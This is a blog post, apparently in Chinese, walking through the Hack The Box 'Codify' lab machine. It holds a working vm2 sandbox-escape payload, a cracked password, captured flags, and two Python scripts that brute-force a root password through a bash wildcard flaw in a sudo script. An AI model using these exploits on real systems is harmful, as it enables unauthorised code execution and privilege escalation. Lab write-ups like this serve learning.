@@ -1,0 +1,345 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>HTB:Codify | Lavande&#39;s Blog</title>
+  <meta name="author" content="Lavande">
+  
+  <meta name="description" content="nmap结果：
+123456789101112131415161718192021222324┌──(kali㉿kali)-[~/htb/Codify]└─$ sudo nmap -sC -sV --min-rate 10000 10.10.11.239 -oN nmap[sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-25 05:04 ESTStats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 33.33% done; ETC: 05:05 (0:00:12 remaining)Nmap scan report for 10.10.11.239Host is up (0.34s latency).Not shown: 997 closed tcp ports (reset)PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)80/tcp   open  http    Apache httpd 2.4.52|_http-title: Did not follow redirect to http://codify.htb/|_http-server-header: Apache/2.4.52 (Ubuntu)3000/tcp open  http    Node.js Express framework|_http-title: CodifyService Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 28.73 seconds
+
+
+
+vm2 沙盒 JavaScript
+
+limitations
+
+版本3.9.16"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="HTB:Codify"/>
+  <meta property="og:site_name" content="Lavande&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Lavande&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Lavande&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> HTB:Codify</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><img src="/../images/image-20231120223825190.png" alt="image-20231120223825190"></p>
+<p>nmap结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/Codify]</span><br><span class="line">└─$ sudo nmap -sC -sV --min-rate 10000 10.10.11.239 -oN nmap</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-25 05:04 EST</span><br><span class="line">Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 33.33% <span class="keyword">done</span>; ETC: 05:05 (0:00:12 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.239</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)</span><br><span class="line">|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:<span class="built_in">df</span>:7d:0c:88:d6:ce (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: Did not follow redirect to http://codify.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">3000/tcp open  http    Node.js Express framework</span><br><span class="line">|_http-title: Codify</span><br><span class="line">Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 28.73 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231125180807411.png" alt="image-20231125180807411"></p>
+<p><img src="/../images/image-20231125180816432.png" alt="image-20231125180816432"></p>
+<p>vm2 沙盒 JavaScript</p>
+<p><img src="/../images/image-20231125180904638.png" alt="image-20231125180904638"></p>
+<p>limitations</p>
+<p><img src="/../images/image-20231125181422550.png" alt="image-20231125181422550"></p>
+<p>版本3.9.16</p>
+<p><img src="/../images/image-20231125180911577.png" alt="image-20231125180911577"></p>
+<p>CVE：</p>
+<p><img src="/../images/image-20231125181013685.png" alt="image-20231125181013685"></p>
+<p><img src="/../images/image-20231125181047169.png" alt="image-20231125181047169"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">cmd = &#x27;id&#x27;</span></span><br><span class="line"><span class="string">err = &#123;&#125;;</span></span><br><span class="line"><span class="string">const handler = &#123;</span></span><br><span class="line"><span class="string">    getPrototypeOf(target) &#123;</span></span><br><span class="line"><span class="string">        (function stack() &#123;</span></span><br><span class="line"><span class="string">            new Error().stack;</span></span><br><span class="line"><span class="string">            stack();</span></span><br><span class="line"><span class="string">        &#125;)();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">const proxiedErr = new Proxy(err, handler);</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    throw proxiedErr;</span></span><br><span class="line"><span class="string">&#125; catch (&#123;constructor: c&#125;) &#123;</span></span><br><span class="line"><span class="string">    c.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(cmd);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm.<span class="title function_">run</span>(code));</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../images/image-20231125181136797.png" alt="image-20231125181136797"></p>
+<p>尝试建立反向链接</p>
+<p><img src="/../images/image-20231125181922872.png" alt="image-20231125181922872"></p>
+<p><img src="/../images/image-20231125182056157.png" alt="image-20231125182056157"></p>
+<p>建立成功</p>
+<p><img src="/../images/image-20231125182108973.png" alt="image-20231125182108973"></p>
+<p><img src="/../images/image-20231125182436850.png" alt="image-20231125182436850"></p>
+<p>获取tickets.db 是个SQLite文件</p>
+<p><img src="/../images/image-20231125182931106.png" alt="image-20231125182931106"></p>
+<p>用SQLite DB Browser打开</p>
+<p><img src="/../images/image-20231125185226745.png" alt="image-20231125185226745"></p>
+<p>john破解</p>
+<p><img src="/../images/image-20231125185716041.png" alt="image-20231125185716041"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spongebob1</span><br></pre></td></tr></table></figure>
+
+<p>ssh连接joshua</p>
+<p><img src="/../images/image-20231125185823727.png" alt="image-20231125185823727"></p>
+<p><img src="/../images/image-20231125185854557.png" alt="image-20231125185854557"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">joshua@codify:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">aad81519cc5d4fd22e5330e04f9b3f9b</span><br></pre></td></tr></table></figure>
+
+<p>root:</p>
+<p><img src="/../images/image-20231125190016172.png" alt="image-20231125190016172"></p>
+<p>查看可以以root运行的文件</p>
+<p><img src="/../images/image-20231125190103476.png" alt="image-20231125190103476"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">joshua@codify:~$ <span class="built_in">cat</span> /opt/scripts/mysql-backup.sh </span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">DB_USER=<span class="string">&quot;root&quot;</span></span><br><span class="line">DB_PASS=$(/usr/bin/cat /root/.creds)</span><br><span class="line">BACKUP_DIR=<span class="string">&quot;/var/backups/mysql&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -s -p <span class="string">&quot;Enter MySQL password for <span class="variable">$DB_USER</span>: &quot;</span> USER_PASS</span><br><span class="line">/usr/bin/echo</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$DB_PASS</span> == <span class="variable">$USER_PASS</span> ]]; <span class="keyword">then</span></span><br><span class="line">        /usr/bin/echo <span class="string">&quot;Password confirmed!&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        /usr/bin/echo <span class="string">&quot;Password confirmation failed!&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">/usr/bin/mkdir -p <span class="string">&quot;<span class="variable">$BACKUP_DIR</span>&quot;</span></span><br><span class="line"></span><br><span class="line">databases=$(/usr/bin/mysql -u <span class="string">&quot;<span class="variable">$DB_USER</span>&quot;</span> -h 0.0.0.0 -P 3306 -p<span class="string">&quot;<span class="variable">$DB_PASS</span>&quot;</span> -e <span class="string">&quot;SHOW DATABASES;&quot;</span> | /usr/bin/grep -Ev <span class="string">&quot;(Database|information_schema|performance_schema)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> db <span class="keyword">in</span> <span class="variable">$databases</span>; <span class="keyword">do</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Backing up database: <span class="variable">$db</span>&quot;</span></span><br><span class="line">    /usr/bin/mysqldump --force -u <span class="string">&quot;<span class="variable">$DB_USER</span>&quot;</span> -h 0.0.0.0 -P 3306 -p<span class="string">&quot;<span class="variable">$DB_PASS</span>&quot;</span> <span class="string">&quot;<span class="variable">$db</span>&quot;</span> | /usr/bin/gzip &gt; <span class="string">&quot;<span class="variable">$BACKUP_DIR</span>/<span class="variable">$db</span>.sql.gz&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">/usr/bin/echo <span class="string">&quot;All databases backed up successfully!&quot;</span></span><br><span class="line">/usr/bin/echo <span class="string">&quot;Changing the permissions&quot;</span></span><br><span class="line">/usr/bin/chown root:sys-adm <span class="string">&quot;<span class="variable">$BACKUP_DIR</span>&quot;</span></span><br><span class="line">/usr/bin/chmod 774 -R <span class="string">&quot;<span class="variable">$BACKUP_DIR</span>&quot;</span></span><br><span class="line">/usr/bin/echo <span class="string">&#x27;Done!&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>exploit1.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">all_chars = <span class="built_in">list</span>(string.ascii_letters + string.digits)</span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">fl = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> fl:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> all_chars:</span><br><span class="line">                command = <span class="string">f&quot;echo &#x27;<span class="subst">&#123;passwd&#125;</span><span class="subst">&#123;char&#125;</span>*&#x27; | sudo /opt/scripts/mysql-backup.sh&quot;</span></span><br><span class="line">                out = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>, text=<span class="literal">True</span>).stdout</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;confirmed&quot;</span> <span class="keyword">in</span> out:</span><br><span class="line">                        passwd += char</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;\r<span class="subst">&#123;passwd&#125;</span>&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                fl = <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231125191307060.png" alt="image-20231125191307060"></p>
+<p>exploit2.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_password</span>(<span class="params">p</span>):</span><br><span class="line">	command = <span class="string">f&quot;echo &#x27;<span class="subst">&#123;p&#125;</span>*&#x27; | sudo /opt/scripts/mysql-backup.sh&quot;</span></span><br><span class="line">	result = subprocess.run(command, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;Password confirmed!&quot;</span> <span class="keyword">in</span> result.stdout</span><br><span class="line"></span><br><span class="line">charset = string.ascii_letters + string.digits</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line">is_password_found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> is_password_found:</span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">		<span class="keyword">if</span> check_password(password + char):</span><br><span class="line">			password += char</span><br><span class="line">			<span class="built_in">print</span>(password)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		is_password_found = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231125191339532.png" alt="image-20231125191339532"></p>
+<p><img src="/../images/image-20231125190814525.png" alt="image-20231125190814525"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@codify:~<span class="comment"># cat root.txt</span></span><br><span class="line">39fdf2408df293444be66157be9bf05c</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231125191400917.png" alt="image-20231125191400917"></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/11/21/HTB-Analytics/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/11/19/HTB-Precious/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-11-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Machines/">Machines<span>6</span></a></li> <li><a href="/categories/Machines/Lab/">Lab<span>6</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/HTB/">HTB<span>8</span></a></li> <li><a href="/tags/easy/">easy<span>6</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 Lavande's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
